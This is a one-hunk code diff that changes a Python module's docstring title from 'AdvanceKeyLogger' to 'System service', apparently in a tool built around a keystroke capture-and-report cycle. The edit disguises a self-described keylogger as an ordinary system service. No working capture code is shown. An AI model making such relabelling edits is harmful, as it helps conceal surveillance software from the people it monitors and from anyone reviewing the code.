@@ -1,5 +1,5 @@
 """
-AdvanceKeyLogger — Main entry point.
+System service — Main entry point.
 
 Handles argument parsing, config loading, logging setup,
 and orchestrates the capture-report lifecycle.
